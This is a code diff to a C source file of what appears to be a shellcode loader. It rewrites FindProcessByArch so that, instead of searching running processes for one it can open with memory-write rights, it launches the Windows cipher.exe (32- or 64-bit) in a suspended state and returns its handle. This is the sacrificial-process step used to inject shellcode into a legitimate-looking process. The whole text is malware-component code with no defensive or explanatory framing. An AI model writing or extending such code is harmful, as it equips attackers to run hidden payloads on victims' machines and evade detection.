@@ -1,51 +1,38 @@
 #include "shellcode.h"
+#include "libc.h"
 
 extern API Api;
 
 HANDLE FindProcessByArch(const wchar_t* arch)
 {
-    HANDLE hSnapshot;
-    PROCESSENTRY32 pe32;
+    STARTUPINFOW si;
+    PROCESS_INFORMATION pi;
 
-    // Take a snapshot of all processes in the system
-    hSnapshot = Api.CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
-    if (hSnapshot == INVALID_HANDLE_VALUE) {
-        return NULL;
-    }
+    memset_(&si, 0, sizeof(si));
+    si.cb = sizeof(si);
+    memset_(&pi, 0, sizeof(pi));
 
-    // Iterate through the processes in the system
-    pe32.dwSize = sizeof(PROCESSENTRY32);
-    if (!Api.Process32FirstW(hSnapshot, &pe32)) {
-        Api.CloseHandle(hSnapshot);
-        return NULL;
-    }
-    do {
-        HANDLE hProcess;
-        BOOL isWow64;
+    LPWSTR path32 = L"C:\\Windows\\SysWOW64\\cipher.exe";
+    LPWSTR path64 = L"C:\\Windows\\System32\\cipher.exe";
+    LPWSTR path = 0;
 
-        hProcess = Api.OpenProcess(PROCESS_VM_WRITE | PROCESS_QUERY_INFORMATION, FALSE, pe32.th32ProcessID);
-        if (hProcess == NULL) {
-            continue;
-        }
+    if (wcscmp_(arch, L"x86") == 0)
+        path = path32;
+    else
+        path = path64;
 
-        // Determine the process architecture
-        if (!Api.IsWow64Process(hProcess, &isWow64)) {
-            // Failed to determine the process architecture, so skip to the next process
-            Api.CloseHandle(hProcess);
-            hProcess = NULL;
-            continue;
-        }
+	BOOL status = Api.CreateProcessW(
+		NULL,     // Application name
+		path,     // Command line
+		NULL,     // Process security attributes
+		NULL,     // Primary thread security attributes
+		FALSE,       // Handles are not inherited
+		CREATE_SUSPENDED, // Creation flags
+		NULL,     // Use parent's environment block
+		NULL,        // Starting directory 
+		&si,         // Pointer to STARTUPINFOW structure
+		&pi          // Pointer to PROCESS_INFORMATION structure
+	);
 
-        // Check if the process matches the provided architecture
-        if ((Api.wcscmp(arch, L"x86") == 0 && !isWow64) || (Api.wcscmp(arch, L"x64") == 0 && isWow64)) {
-            if (hProcess != NULL) {
-                Api.CloseHandle(hSnapshot);
-                return hProcess;
-            }
-        }
-    } while (Api.Process32NextW(hSnapshot, &pe32));
-
-    // No matching process found
-    Api.CloseHandle(hSnapshot);
-    return NULL;
+    return pi.hProcess;
 }
